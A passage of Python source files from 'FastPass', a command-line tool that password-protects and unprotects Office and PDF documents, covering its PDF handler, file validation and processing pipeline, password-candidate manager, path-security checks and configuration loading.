        Clean up any handler-specific resources
        """
        # Office handler doesn't maintain persistent resources
        pass
</file>

<file path="src/core/crypto_handlers/pdf_handler.py">
"""
FastPass PDF Handler
Maps to: C1d_PDF, C2b_Config - PyPDF2 integration
"""

# A1a: Load System Tools
import logging
from pathlib import Path
from typing import Dict, Any

try:
    import PyPDF2
except ImportError:
    PyPDF2 = None


class PDFHandler:
    """
    PDF document encryption/decryption handler
    Uses PyPDF2 for crypto operations
    """
    
    def __init__(self, logger: logging.Logger):
        self.logger = logger
        
        if PyPDF2 is None:
            raise ImportError("PyPDF2 is required for PDF document processing")
        
        # C2b_Config: Configure PDF Settings
        self.encryption_method = 'AES-256'
        self.user_password_length = 128
        
        self.logger.debug("PDF handler initialized")
    
    def configure(self, config: Dict[str, Any]) -> None:
        """
        C2b: Configure PDF Handler
        Set PDF-specific configuration options
        """
        self.encryption_method = config.get('pdf_encryption_method', self.encryption_method)
        self.user_password_length = config.get('pdf_password_length', self.user_password_length)
    
    def test_password(self, file_path: Path, password: str) -> bool:
        """
        Test if password works for PDF document
        Returns True if password is correct, False otherwise
        """
        try:
            with open(file_path, 'rb') as f:
                pdf_reader = PyPDF2.PdfReader(f)
                
                if not pdf_reader.is_encrypted:
                    # PDF is not encrypted, so any password "works" for decryption
                    return True
                
                # Try to decrypt with password
                result = pdf_reader.decrypt(password)
                
                # PyPDF2 returns:
                # 0: Failed
                # 1: Succeeded with user password
                # 2: Succeeded with owner password
                return result > 0
                
        except Exception as e:
            self.logger.debug(f"Password test failed for {file_path}: {e}")
            return False
    
    def encrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """
        Encrypt PDF document with password
        Full encryption support using PyPDF2
        """
        try:
            with open(input_path, 'rb') as input_file:
                pdf_reader = PyPDF2.PdfReader(input_file)
                pdf_writer = PyPDF2.PdfWriter()
                
                # Copy all pages from input to output
                for page_num in range(len(pdf_reader.pages)):
                    page = pdf_reader.pages[page_num]
                    pdf_writer.add_page(page)
                
                # Encrypt the PDF with password
                pdf_writer.encrypt(
                    user_password=password,
                    owner_password=password,  # Use same password for both
                    use_128bit=True
                )
                
                # Write encrypted PDF to output file
                with open(output_path, 'wb') as output_file:
                    pdf_writer.write(output_file)
                
                self.logger.info(f"Successfully encrypted {input_path.name}")
                
        except Exception as e:
            raise Exception(f"Failed to encrypt PDF {input_path}: {e}")
    
    def decrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """
        Decrypt PDF document with password
        Full decryption support using PyPDF2
        """
        try:
            with open(input_path, 'rb') as input_file:
                pdf_reader = PyPDF2.PdfReader(input_file)
                
                if not pdf_reader.is_encrypted:
                    # PDF is not encrypted, just copy it
                    import shutil
                    shutil.copy2(input_path, output_path)
                    self.logger.info(f"PDF {input_path.name} was not encrypted, copied as-is")
                    return
                
                # Decrypt with password
                decrypt_result = pdf_reader.decrypt(password)
                if decrypt_result == 0:
                    raise Exception(f"Incorrect password for PDF {input_path}")
                
                # Create writer and copy all pages
                pdf_writer = PyPDF2.PdfWriter()
                
                for page_num in range(len(pdf_reader.pages)):
                    page = pdf_reader.pages[page_num]
                    pdf_writer.add_page(page)
                
                # Write decrypted PDF to output file
                with open(output_path, 'wb') as output_file:
                    pdf_writer.write(output_file)
                
                self.logger.info(f"Successfully decrypted {input_path.name}")
                
        except Exception as e:
            raise Exception(f"Failed to decrypt PDF {input_path}: {e}")
    
    def cleanup(self) -> None:
        """
        E2d: Call Handler Cleanup
        Clean up any handler-specific resources
        """
        # PDF handler doesn't maintain persistent resources
        pass
</file>

<file path="src/core/file_handler.py">
"""
FastPass File Handler Module
Maps to: Section B3a-B6h File Validation and Section D File Processing
"""

# A1a: Load System Tools
import filetype
import tempfile
import shutil
import hashlib
import os
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from datetime import datetime
import logging

from utils.config import FastPassConfig


# Custom Exception Classes
class FileFormatError(Exception):
    """Raised when file format validation fails"""
    pass

class ProcessingError(Exception):
    """Raised when file processing fails"""
    pass


@dataclass
class FileManifest:
    """
    B6a: Create FileManifest Object
    Data structure to hold file metadata and processing information
    """
    path: Path
    format: str
    size: int
    is_encrypted: bool
    crypto_tool: str
    security_checked: bool = False
    access_verified: bool = False


class FileValidator:
    """
    File format validation and detection
    Maps to B3a-B6h from flowchart
    """
    
    def __init__(self, logger: logging.Logger, config: Dict[str, Any]):
        self.logger = logger
        self.config = config
        self.max_file_size = config.get('max_file_size', FastPassConfig.MAX_FILE_SIZE)
    
    def validate_file(self, file_path: Path) -> FileManifest:
        """
        B3a-B6e: Complete file validation pipeline
        Validate file format, content, and create manifest
        """
        
        # B1f: Verify File Actually Exists
        if not file_path.exists():
            raise FileFormatError(f"File not found: {file_path}")
        
        if not file_path.is_file():
            raise FileFormatError(f"Path is not a file: {file_path}")
        
        # B3a-B3e: Enhanced File Format Validation
        file_format = self._detect_file_format(file_path)
        
        # B4a-B4d: File Access and Size Validation
        self._validate_file_access_and_size(file_path)
        
        # B5a-B5c: Encryption Status Detection
        is_encrypted = self._detect_encryption_status(file_path, file_format)
        
        # B6a-B6e: Build File Manifest
        manifest = FileManifest(
            path=file_path,
            format=file_format,
            size=file_path.stat().st_size,
            is_encrypted=is_encrypted,
            crypto_tool=FastPassConfig.SUPPORTED_FORMATS[file_format],
            security_checked=True,
            access_verified=True
        )
        
        # B6f: Log File Validation
        self.logger.debug(f"Validated: {file_path} (format: {file_format}, encrypted: {is_encrypted})")
        
        return manifest
    
    def _detect_file_format(self, file_path: Path) -> str:
        """
        B3b-B3e: Enhanced File Format Validation (Magic Number Priority)
        Detect file format using magic numbers with extension fallback
        """
        
        # B3b: Detect Format via Magic Numbers (Primary)
        try:
            detected_type = filetype.guess(str(file_path))
            if detected_type:
                # Convert MIME type to extension
                mime_to_ext = {
                    'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
                    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx',
                    'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx',
                    'application/pdf': '.pdf'
                }
                
                detected_ext = mime_to_ext.get(detected_type.mime)
                if detected_ext:
                    # B3b_Success: Use Magic Number Result
                    file_ext = file_path.suffix.lower()
                    if file_ext != detected_ext:
                        # B3e_Mismatch: Format Mismatch
                        self.logger.warning(f"Extension {file_ext} != detected {detected_ext} for {file_path}")
                    return detected_ext
        except Exception as e:
            # B3b_Fallback: Use Extension Validation
            self.logger.warning(f"Magic number detection failed for {file_path}: {e}")
        
        # B3c: Validate Extension Against Supported Formats
        file_ext = file_path.suffix.lower()
        
        # B3d: Verify FastPass Can Handle This Format
        if file_ext not in FastPassConfig.SUPPORTED_FORMATS:
            # B3d_Unsupported: File Type Not Supported
            raise FileFormatError(
                f"Unsupported file format: {file_ext}. "
                f"Supported formats: {list(FastPassConfig.SUPPORTED_FORMATS.keys())}"
            )
        
        return file_ext
    
    def _validate_file_access_and_size(self, file_path: Path) -> None:
        """
        B4a-B4d: File Access Validation
        Check file readability, size limits, and permissions
        """
        
        # B4a: Test File Reading Capability
        try:
            with open(file_path, 'rb') as f:
                # Read a small sample to verify access
                f.read(1024)
        except Exception as e:
            # B4a_Read: File Reading Blocked
            raise FileFormatError(f"Cannot read file {file_path}: {e}")
        
        # B4b: Check File Size Limits
        file_size = file_path.stat().st_size
        
        if file_size == 0:
            # B4b_Empty: File Contains No Data
            raise FileFormatError(f"File is empty: {file_path}")
        
        if file_size > self.max_file_size:
            # B4b_Large: File Exceeds Size Limit
            raise FileFormatError(
                f"File too large: {file_size} bytes (limit: {self.max_file_size} bytes)"
            )
        
        # B4c: Check File Modification Permission
        parent_dir = file_path.parent
        if not os.access(parent_dir, os.W_OK):
            # B4c_Write: File Modification Blocked
            raise FileFormatError(f"No write permission for directory: {parent_dir}")
    
    def _detect_encryption_status(self, file_path: Path, file_format: str) -> bool:
        """
        B5a-B5c: Encryption Status Detection
        Determine if file is password-protected
        """
        
        # B5a: Determine File Type Handler
        crypto_tool = FastPassConfig.SUPPORTED_FORMATS[file_format]
        
        try:
            # B5b: Test Encryption Status
            with open(file_path, 'rb') as f:
                if crypto_tool == 'msoffcrypto':
                    # B5a_Office: Office Document Detection
                    import msoffcrypto
                    office_file = msoffcrypto.OfficeFile(f)
                    return office_file.is_encrypted()
                
                elif crypto_tool == 'PyPDF2':
                    # B5a_PDF: PDF Document Detection
                    import PyPDF2
                    pdf_reader = PyPDF2.PdfReader(f)
                    return pdf_reader.is_encrypted
                
        except Exception as e:
            # B5b_Failed: Encryption Detection Failed
            self.logger.warning(f"Cannot detect encryption for {file_path}: {e}")
            # Assume unencrypted and proceed with caution
            return False
        
        return False


class FileProcessor:
    """
    File processing pipeline with crypto operations
    Maps to Section D from flowchart
    """
    
    def __init__(self, logger: logging.Logger, config: Dict[str, Any], 
                 password_manager, crypto_handlers: Dict, temp_files_created: List):
        self.logger = logger
        self.config = config
        self.password_manager = password_manager
        self.crypto_handlers = crypto_handlers
        self.temp_files_created = temp_files_created
    
    def process_files(self, validated_files: List[FileManifest], 
                     operation: str, output_dir: Optional[Path]) -> Dict:
        """
        D2a-D4g: Main File Processing Pipeline
        Process all validated files with crypto operations
        """
        
        # D1a-D1f: Initialize TempFileManager and secure temp directory
        with tempfile.TemporaryDirectory(prefix=self.config['temp_dir_prefix']) as temp_dir_str:
            temp_dir = Path(temp_dir_str)
            
            # D1c: Set Enhanced Secure Permissions
            temp_dir.chmod(0o700)
            
            # Create processing subdirectories
            processing_dir = temp_dir / 'processing'
            output_temp_dir = temp_dir / 'output'
            processing_dir.mkdir(mode=0o700)
            output_temp_dir.mkdir(mode=0o700)
            
            # D2a: Initialize Processing Results
            successful_files = []
            failed_files = []
            
            # D2b: Start Main Processing Loop
            for file_manifest in validated_files:
                try:
                    result = self._process_single_file(
                        file_manifest, operation, output_dir,
                        processing_dir, output_temp_dir
                    )
                    successful_files.append(result)
                    
                except Exception as e:
                    error = FileProcessingError(file_manifest.path, str(e))
                    failed_files.append(error)
                    self.logger.error(f"Failed to process {file_manifest.path}: {e}")
            
            return {
                'successful_files': successful_files,
                'failed_files': failed_files,
                'total_files': len(validated_files)
            }
    
    def _process_single_file(self, file_manifest: FileManifest, operation: str,
                           output_dir: Optional[Path], processing_dir: Path,
                           output_temp_dir: Path) -> 'FileProcessingResult':
        """
        D2c-D4g: Process single file through complete pipeline
        """
        
        # D2c: Get Crypto Handler
        handler = self.crypto_handlers[file_manifest.crypto_tool]
        
        # D2d: Find Working Password
        if operation in ['decrypt', 'check-password'] and file_manifest.is_encrypted:
            password = self.password_manager.find_working_password(file_manifest.path, handler)
            if not password:
                raise ProcessingError(f"No working password found for {file_manifest.path}")
        elif operation == 'encrypt':
            # For encryption, use first available password
            passwords = self.password_manager.get_password_candidates(file_manifest.path)
            if not passwords:
                raise ProcessingError(f"No password specified for encryption of {file_manifest.path}")
            password = passwords[0]
        else:
            password = None
        
        # D2e-D2f: Setup Temp File Paths and Copy Input
        temp_input = processing_dir / f'input_{file_manifest.path.name}'
        temp_output = output_temp_dir / f'output_{file_manifest.path.name}'
        
        shutil.copy2(file_manifest.path, temp_input)
        
        # D2g-D2h: Perform Crypto Operation
        if operation == 'encrypt':
            handler.encrypt_file(temp_input, temp_output, password)
        elif operation == 'decrypt':
            handler.decrypt_file(temp_input, temp_output, password)
        elif operation == 'check-password':
            # For check-password, just verify we can open with password
            if file_manifest.is_encrypted:
                if not handler.test_password(temp_input, password):
                    raise ProcessingError(f"Password verification failed for {file_manifest.path}")
            # No output file needed for check-password
            temp_output = None
        
        # D3a-D3d: Output Validation (if output file was created)
        if temp_output and operation != 'check-password':
            self._validate_output_file(temp_output, file_manifest, operation)
        
        # D4a-D4g: File Movement and Final Result
        if operation != 'check-password':
            final_path = self._move_to_final_location(
                temp_output, file_manifest.path, output_dir
            )
        else:
            final_path = file_manifest.path  # No file movement for check-password
        
        # D4f-D4g: Create Processing Result
        return FileProcessingResult(
            original_path=file_manifest.path,
            final_path=final_path,
            operation=operation,
            password_used=password is not None,
            checksum=self._calculate_checksum(final_path) if final_path.exists() else None
        )
    
    def _validate_output_file(self, temp_output: Path, file_manifest: FileManifest, operation: str) -> None:
        """
        D3a-D3d: Output Validation
        Validate the processed output file
        """
        
        # D3a: Validate Output File Exists
        if not temp_output.exists():
            raise ProcessingError("Crypto operation did not create output file")
        
        # D3b: Check Output File Size
        output_size = temp_output.stat().st_size
        if output_size == 0:
            raise ProcessingError("Output file is empty")
        
        # D3c: Format-Specific Validation
        try:
            if file_manifest.crypto_tool == 'msoffcrypto':
                # D3c_Office: Validate Office Document
                import msoffcrypto
                with open(temp_output, 'rb') as f:
                    office_file = msoffcrypto.OfficeFile(f)
                    # Try to read document structure
                    
            elif file_manifest.crypto_tool == 'PyPDF2':
                # D3c_PDF: Validate PDF Document
                import PyPDF2
                with open(temp_output, 'rb') as f:
                    pdf_reader = PyPDF2.PdfReader(f)
                    # Try to read PDF structure
                    
        except Exception as e:
            raise ProcessingError(f"Output file validation failed: {e}")
        
        # D3d: Validate Encryption Status Changed
        current_encrypted = self._detect_encryption_status_for_validation(temp_output, file_manifest.format)
        expected_encrypted = operation == 'encrypt'
        
        if current_encrypted != expected_encrypted:
            raise ProcessingError(f"Encryption status not changed correctly (expected: {expected_encrypted}, actual: {current_encrypted})")
    
    def _detect_encryption_status_for_validation(self, file_path: Path, file_format: str) -> bool:
        """Helper to detect encryption status for validation"""
        crypto_tool = FastPassConfig.SUPPORTED_FORMATS[file_format]
        
        try:
            with open(file_path, 'rb') as f:
                if crypto_tool == 'msoffcrypto':
                    import msoffcrypto
                    office_file = msoffcrypto.OfficeFile(f)
                    return office_file.is_encrypted()
                elif crypto_tool == 'PyPDF2':
                    import PyPDF2
                    pdf_reader = PyPDF2.PdfReader(f)
                    return pdf_reader.is_encrypted
        except Exception:
            return False
        
        return False
    
    def _move_to_final_location(self, temp_output: Path, original_path: Path, 
                              output_dir: Optional[Path]) -> Path:
        """
        D4a-D4e: Enhanced File Movement with Error Handling
        Move processed file to final location
        """
        
        # D4a: Determine Final Output Path with Validation
        if output_dir:
            final_path = output_dir / original_path.name
        else:
            # In-place modification
            final_path = original_path
        
        # D4b: Handle Filename Conflicts
        if final_path.exists() and final_path != original_path:
            # Generate unique name for output directory
            counter = 1
            base = final_path.stem
            suffix = final_path.suffix
            while final_path.exists():
                final_path = final_path.parent / f"{base}_{counter}{suffix}"
                counter += 1
        
        # D4c: Atomic Move with Error Handling
        try:
            # Ensure target directory exists
            final_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Atomic move
            shutil.move(str(temp_output), str(final_path))
            
        except Exception as e:
            raise ProcessingError(f"Failed to move file to final location: {e}")
        
        # D4d: Update File Permissions
        final_path.chmod(self.config['secure_permissions'])
        
        return final_path
    
    def _calculate_checksum(self, file_path: Path) -> str:
        """
        D4e: Generate File Checksum
        Calculate SHA256 checksum for file integrity
        """
        try:
            return hashlib.sha256(file_path.read_bytes()).hexdigest()
        except Exception:
            return None


@dataclass
class FileProcessingResult:
    """Result of processing a single file"""
    original_path: Path
    final_path: Path
    operation: str
    password_used: bool
    checksum: Optional[str] = None


@dataclass
class FileProcessingError:
    """Error during file processing"""
    path: Path
    message: str


class ResultsReporter:
    """
    Results reporting and exit code determination
    Maps to Section E4a-E5d from flowchart
    """
    
    def __init__(self, logger: logging.Logger, start_time: datetime):
        self.logger = logger
        self.start_time = start_time
    
    def generate_report(self, processing_results: Dict) -> int:
        """
        E4a-E5d: Report generation and exit code determination
        Generate comprehensive report and determine exit code
        """
        
        # E1a-E1e: Calculate Processing Metrics
        end_time = datetime.now()
        duration = end_time - self.start_time
        
        successful_files = processing_results['successful_files']
        failed_files = processing_results['failed_files']
        total_files = processing_results['total_files']
        
        # E4b-E4d: Generate Report
        self._print_results_summary(successful_files, failed_files, total_files, duration)
        
        # E5a-E5d: Exit Code Determination
        return self._determine_exit_code(successful_files, failed_files)
    
    def _print_results_summary(self, successful_files: List, failed_files: List, 
                             total_files: int, duration) -> None:
        """
        E4b-E4e: Print comprehensive results summary
        """
        
        print(f"\nFastPass Processing Complete")
        print(f"{'=' * 40}")
        print(f"Total files processed: {total_files}")
        print(f"Successful: {len(successful_files)}")
        print(f"Failed: {len(failed_files)}")
        print(f"Processing time: {duration.total_seconds():.2f} seconds")
        
        if successful_files:
            print(f"\nSuccessful files:")
            for result in successful_files:
                print(f"  SUCCESS: {result.original_path}")
        
        if failed_files:
            print(f"\nFailed files:")
            for error in failed_files:
                print(f"  FAILED: {error.path}: {error.message}")
    
    def _determine_exit_code(self, successful_files: List, failed_files: List) -> int:
        """
        E5a-E5d: Exit Code Determination
        Determine appropriate exit code based on results
        """
        
        success_count = len(successful_files)
        failure_count = len(failed_files)
        
        if failure_count == 0 and success_count > 0:
            # E5b_Success: Exit Code 0
            self.logger.info("All operations successful")
            return 0
        elif success_count > 0 and failure_count > 0:
            # E5b_Mixed: Exit Code 1
            self.logger.warning("Some operations failed")
            return 1
        else:
            # E5b_Failure: Exit Code 1
            self.logger.error("All operations failed")
            return 1
</file>

<file path="src/core/password/__init__.py">
"""
FastPass Password Handling Modules
"""

from .password_manager import PasswordManager

__all__ = ['PasswordManager']
</file>

<file path="src/core/password/password_manager.py">
"""
FastPass Password Management System
Maps to: C3a-C5d Password Management and Testing from flowchart
"""

# A1a: Load System Tools
from pathlib import Path
from typing import List, Optional, Dict, Any
import logging


class PasswordManager:
    """
    Password handling with multiple sources and priority algorithm
    Maps to: C3a-C5d from flowchart
    """
    
    def __init__(self, cli_passwords: List[str] = None, 
                 password_list_file: Optional[Path] = None,
                 stdin_mapping: Optional[Dict[str, str]] = None):
        """
        C3a-C3c: Initialize PasswordManager Class
        Set up password storage and management
        """
        
        # C3b: Remember User's Passwords
        self.cli_passwords = cli_passwords or []
        self.password_list_file = password_list_file
        self.stdin_mapping = stdin_mapping or {}
        
        # C3c: Prepare Password Storage
        self.password_list = []
        
        # C3d: Load Passwords from File
        if self.password_list_file:
            self._load_password_list()
    
    def _load_password_list(self) -> None:
        """
        C3d_Load: Read Passwords from File
        Load passwords from text file, one per line
        """
        try:
            with open(self.password_list_file, 'r', encoding='utf-8') as f:
                self.password_list = [line.strip() for line in f if line.strip()]
            
            # C3d_Load_Success: Passwords Successfully Loaded
            print(f"Loaded {len(self.password_list)} passwords from file")
            
        except FileNotFoundError:
            # C3d_Load_Error: Cannot Read Password File
            print(f"Warning: Password list file not found: {self.password_list_file}")
            self.password_list = []
        except Exception as e:
            print(f"Warning: Error reading password file {self.password_list_file}: {e}")
            self.password_list = []
    
    def get_password_candidates(self, file_path: Path) -> List[str]:
        """
        C4a-C4e: Get prioritized list of passwords to try for a file
        Build password list with priority ordering
        """
        
        # C4a: Start Building Password List
        candidates = []
        
        # Check for file-specific password from stdin mapping
        if self.stdin_mapping:
            file_name = file_path.name
            if file_name in self.stdin_mapping:
                candidates.append(self.stdin_mapping[file_name])
        
        # C4b: Add Command-Line Passwords First
        # Put passwords user typed in command first
        candidates.extend(self.cli_passwords)
        
        # C4c: Add File Passwords Second
        # Add passwords from password file after command-line ones
        candidates.extend(self.password_list)
        
        # C4d: Remove Duplicate Passwords
        # Eliminate passwords that appear multiple times
        seen = set()
        unique_candidates = []
        
        # C4d_Loop: Check Each Password for Duplicates
        for password in candidates:
            if password not in seen:
                # C4d_Add: Add New Password to List
                seen.add(password)
                unique_candidates.append(password)
        
        # C4e: Finalize Password List
        return unique_candidates
    
    def find_working_password(self, file_path: Path, crypto_handler) -> Optional[str]:
        """
        C5a-C5d: Find working password for file by trying all candidates
        Password testing mechanism
        """
        
        # C5a-C5b: Set Up Password Testing System and get passwords
        candidates = self.get_password_candidates(file_path)
        
        if not candidates:
            return None
        
        # C5c-C5d: Begin Trying Passwords
        for password in candidates:
            try:
                # C5d: Try Current Password
                if crypto_handler.test_password(file_path, password):
                    # C5d_Success: Found Working Password
                    return password
                    
            except Exception as e:
                # Continue trying other passwords
                continue
        
        # C5d_Failed: No Password Works
        return None
    
    def clear_passwords(self) -> None:
        """
        E3a-E3d: Clear passwords from memory for security
        Overwrite password memory
        """
        
        # E3a_Loop: Overwrite Password Memory
        if self.cli_passwords:
            for i in range(len(self.cli_passwords)):
                if self.cli_passwords[i]:
                    # E3a_Overwrite: Overwrite Password
                    self.cli_passwords[i] = 'X' * len(self.cli_passwords[i])
            self.cli_passwords.clear()
        
        if self.password_list:
            for i in range(len(self.password_list)):
                if self.password_list[i]:
                    self.password_list[i] = 'X' * len(self.password_list[i])
            self.password_list.clear()
        
        if self.stdin_mapping:
            for key in self.stdin_mapping:
                if self.stdin_mapping[key]:
                    self.stdin_mapping[key] = 'X' * len(self.stdin_mapping[key])
            self.stdin_mapping.clear()
        
        # E3c: Force Garbage Collection
        import gc
        gc.collect()
</file>

<file path="src/core/security.py">
"""
FastPass Security Validation Module
Maps to: Section B2a-B2e Enhanced Security Validation from flowchart
"""

# A1a: Load System Tools
import os
import stat
from pathlib import Path
from typing import Set
import logging

from app import SecurityViolationError


class SecurityValidator:
    """
    Security validation and path checking
    Implements comprehensive security hardening
    """
    
    def __init__(self, logger: logging.Logger):
        self.logger = logger
        
        # B2d: Set Security Boundaries
        # Define which folders the program is allowed to access
        self.allowed_directories = self._get_allowed_directories()
    
    def _get_allowed_directories(self) -> Set[Path]:
        """
        B2d: Set Security Boundaries
        Define allowed security zones for file access
        """
        allowed = set()
        
        # User's home directory
        try:
            allowed.add(Path.home().resolve())
        except Exception:
            pass
        
        # Current working directory (with explicit allow flag)
        # Note: CWD access should require --allow-cwd flag in production
        try:
            allowed.add(Path.cwd().resolve())
        except Exception:
            pass
        
        return allowed
    
    def validate_file_path(self, file_path: Path) -> Path:
        """
        B2a-B2e: Complete path security validation
        Comprehensive security checks for file paths
        """
        
        # B2a: Resolve Absolute Paths for Security
        # Use Path.resolve() to get canonical paths
        try:
            resolved_path = file_path.resolve()
        except Exception as e:
            raise SecurityViolationError(f"Cannot resolve path: {file_path}")
        
        # B2b: Validate Against Allowed Directories
        # Check if resolved path is within approved locations
        if not self._is_path_within_allowed_directories(resolved_path):
            # B2b_Danger: Security Violation Detected
            raise SecurityViolationError(
                f"File path outside approved security boundaries: {file_path}"
            )
        
        # B2c: Check Each Path Element
        # Examine every folder and file name in the path
        self._validate_path_components(resolved_path)
        
        # B2e: Verify File Within Safe Zone
        # Final verification that file is in safe area
        if not self._is_file_in_safe_zone(resolved_path):
            # B2e_Security: File Access Blocked
            raise SecurityViolationError(
                f"File access blocked by security policy: {file_path}"
            )
        
        self.logger.debug(f"Security validation passed: {resolved_path}")
        return resolved_path
    
    def _is_path_within_allowed_directories(self, resolved_path: Path) -> bool:
        """
        B2b_Check: Path Within Security Boundaries?
        Check if path is contained within approved locations
        """
        for allowed_dir in self.allowed_directories:
            try:
                # Use relative_to() to check containment
                resolved_path.relative_to(allowed_dir)
                return True
            except ValueError:
                # Path is not relative to this allowed directory
                continue
        
        return False
    
    def _validate_path_components(self, resolved_path: Path) -> None:
        """
        B2c: Check Each Path Element
        Examine every folder and file name for security violations
        """
        
        # B2c_Loop: Examine Path Elements One by One
        for part in resolved_path.parts:
            if not self._is_path_component_safe(part):
                # B2c_Invalid: Unsafe Path Element Found
                raise SecurityViolationError(
                    f"Unsafe path component detected: {part}"
                )
    
    def _is_path_component_safe(self, component: str) -> bool:
        """
        B2c_Check: Path Element Safe?
        Check individual path components for safety
        """
        
        # Skip drive letters on Windows (e.g., "C:", "D:")
        if len(component) == 2 and component[1] == ':' and component[0].isalpha():
            return True
        
        # Skip root directory
        if component in ['/', '\\']:
            return True
        
        # Check for dangerous patterns
        dangerous_patterns = [
            '..', '..',  # Path traversal
            'CON', 'PRN', 'AUX', 'NUL',  # Windows reserved names
            'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9',
            'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9'
        ]
        
        component_upper = component.upper()
        if component_upper in dangerous_patterns:
            return False
        
        # Check for dangerous characters (but allow colon for drive letters already handled above)
        dangerous_chars = '<>"|?*'
        if any(char in component for char in dangerous_chars):
            return False
        
        # Check for control characters
        if any(ord(char) < 32 for char in component):
            return False
        
        # Check for leading/trailing spaces or dots (Windows issues)
        if component != component.strip(' .'):
            return False
        
        return True
    
    def _is_file_in_safe_zone(self, resolved_path: Path) -> bool:
        """
        B2e_Check: File in Safe Area?
        Final security zone verification
        """
        
        # Additional checks for symbolic links
        try:
            if resolved_path.is_symlink():
                # Check if symlink target is also in safe zone
                target = resolved_path.readlink()
                if target.is_absolute():
                    return self._is_path_within_allowed_directories(target)
                else:
                    # Relative symlink - resolve relative to symlink location
                    target_resolved = (resolved_path.parent / target).resolve()
                    return self._is_path_within_allowed_directories(target_resolved)
        except Exception:
            # If we can't validate symlink, reject it
            return False
        
        # Check file permissions for additional security
        try:
            file_stat = resolved_path.stat()
            
            # On Unix-like systems, check for world-writable files
            if hasattr(stat, 'S_IWOTH') and file_stat.st_mode & stat.S_IWOTH:
                self.logger.warning(f"World-writable file detected: {resolved_path}")
                # Continue but log warning
        except Exception:
            # If we can't check permissions, continue
            pass
        
        return True
    
    def validate_output_directory(self, output_dir: Path) -> Path:
        """
        Additional validation for output directories
        """
        if output_dir is None:
            return None
        
        try:
            resolved_output = output_dir.resolve()
        except Exception as e:
            raise SecurityViolationError(f"Cannot resolve output directory: {output_dir}")
        
        # Check if output directory is within allowed boundaries
        if not self._is_path_within_allowed_directories(resolved_output):
            raise SecurityViolationError(
                f"Output directory outside security boundaries: {output_dir}"
            )
        
        # Create directory if it doesn't exist
        try:
            resolved_output.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            raise SecurityViolationError(f"Cannot create output directory: {output_dir}")
        
        return resolved_output
</file>

<file path="src/utils/__init__.py">
"""
FastPass Utility Modules
"""

from .config import FastPassConfig
from .logger import setup_logger

__all__ = ['FastPassConfig', 'setup_logger']
</file>

<file path="src/utils/config.py">
"""
FastPass Configuration Management System
Maps to: CONFIGURATION MANAGEMENT SYSTEM from flowchart
"""

# A1a: Load System Tools
import json
import os
from pathlib import Path
from typing import Dict, Any
import argparse


class FastPassConfig:
    """Configuration management with multiple sources and precedence"""
    
    # CONFIGURATION MANAGEMENT SYSTEM constants
    VERSION = "1.0.0"
    MAX_FILE_SIZE = 500 * 1024 * 1024  # 500MB
    TEMP_DIR_PREFIX = "fastpass_"
    SECURE_FILE_PERMISSIONS = 0o600
    SUPPORTED_FORMATS = {
        '.docx': 'msoffcrypto',
        '.xlsx': 'msoffcrypto', 
        '.pptx': 'msoffcrypto',
        '.docm': 'msoffcrypto',
        '.xlsm': 'msoffcrypto',
        '.pptm': 'msoffcrypto',
        '.dotx': 'msoffcrypto',
        '.xltx': 'msoffcrypto',
        '.potx': 'msoffcrypto',
        '.pdf': 'PyPDF2'
    }
    
    # Configuration file locations (in order of precedence)
    CONFIG_LOCATIONS = [
        Path.home() / '.fastpass' / 'config.json',  # User config
        Path.cwd() / 'fastpass.json',               # Project config
        Path(__file__).parent.parent / 'config.json'  # Default config
    ]
    
    @classmethod
    def load_configuration(cls, cli_args: argparse.Namespace) -> Dict[str, Any]:
        """Load configuration from multiple sources with precedence"""
        config = cls._get_default_config()
        
        # 1. Load from config files (lowest precedence)
        for config_path in cls.CONFIG_LOCATIONS:
            if config_path.exists():
                try:
                    with open(config_path, 'r') as f:
                        file_config = json.load(f)
                        config.update(file_config)
                except (json.JSONDecodeError, IOError) as e:
                    print(f"Warning: Could not load config from {config_path}: {e}")
        
        # 2. Load from environment variables
        env_config = cls._load_from_environment()
        config.update(env_config)
        
        # 3. Override with CLI arguments (highest precedence)
        cli_config = cls._extract_cli_config(cli_args)
        config.update(cli_config)
        
        return config
    
    @classmethod
    def _get_default_config(cls) -> Dict[str, Any]:
        """Default configuration values"""
        return {
            'max_file_size': cls.MAX_FILE_SIZE,
            'temp_dir_prefix': cls.TEMP_DIR_PREFIX,
            'secure_permissions': cls.SECURE_FILE_PERMISSIONS,
            'supported_formats': cls.SUPPORTED_FORMATS.copy(),
            'debug': False,
            'verify': False,
            'dry_run': False
        }
    
    @classmethod
    def _load_from_environment(cls) -> Dict[str, Any]:
        """Load configuration from environment variables"""
        env_config = {}
        
        # Check for FASTPASS_* environment variables
        if os.getenv('FASTPASS_DEBUG'):
            env_config['debug'] = os.getenv('FASTPASS_DEBUG').lower() in ('1', 'true', 'yes')
        
        if os.getenv('FASTPASS_MAX_FILE_SIZE'):
            try:
                env_config['max_file_size'] = int(os.getenv('FASTPASS_MAX_FILE_SIZE'))
            except ValueError:
                pass
        
        return env_config
    
    @classmethod
    def _extract_cli_config(cls, cli_args: argparse.Namespace) -> Dict[str, Any]:
        """Extract configuration from CLI arguments"""
        cli_config = {}
        
        if hasattr(cli_args, 'debug') and cli_args.debug:
            cli_config['debug'] = True
        
        if hasattr(cli_args, 'verify') and cli_args.verify:
            cli_config['verify'] = True
            
        if hasattr(cli_args, 'dry_run') and cli_args.dry_run:
            cli_config['dry_run'] = True
        
        return cli_config
</file>

<file path="src/utils/logger.py">
"""
FastPass Logging Configuration
Maps to: A3a-A3e Enhanced Logging Setup with TTY Detection
"""

# A1a: Load System Tools
import logging
import sys
import os
from pathlib import Path
from datetime import datetime
from typing import Optional


def setup_logger(name: str = "fastpass", 
                debug: bool = False, 
                log_file: Optional[Path] = None) -> logging.Logger:
    """
    A3a: Configure Console and File Logging
    Detect TTY for appropriate log formatting
    Set up both console and optional file logging
    """
    logger = logging.getLogger(name)
    
    # Clear any existing handlers
    logger.handlers.clear()
    
    # Set log level
